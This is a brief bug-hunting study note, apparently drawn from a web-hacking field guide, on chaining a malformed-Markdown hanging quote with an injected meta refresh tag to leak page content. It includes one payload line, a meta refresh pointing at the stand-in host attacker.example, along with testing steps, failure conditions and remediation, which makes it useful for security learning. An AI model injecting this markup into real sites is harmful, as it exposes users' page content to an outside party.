# Markdown Hanging-Quote + Meta Refresh Exfiltration

- What it is: Malformed Markdown can create a dangling quote that browser parsing joins with another injected quote.
- Look for Markdown fields that generate HTML attributes such as `href` or `title`.
- Submit malformed quote syntax and inspect the generated HTML for an unterminated attribute.
- The book describes chaining this with an attacker-controlled `<meta http-equiv="refresh">`.
```html
<meta http-equiv="refresh" content='0; url=https://attacker.example/log?text=
```
- A later attacker-controlled single quote can terminate the attribute after intervening page content.
- The browser may place the intervening content into the outbound refresh URL.
- Treat this as a chaining condition: a lone hanging quote is generally not enough by itself.
- False positive: if the Markdown renderer escapes quotes or the browser repairs the markup without spanning content, the chain fails.
- Edge case: framework/browser HTML parsing behavior determines whether the malformed DOM is exploitable.
- Remediation: use a hardened Markdown sanitizer and never insert generated HTML through unsafe DOM sinks.
## Source: Real-World Bug Hunting — A Field Guide to Web Hacking, Ch. 5
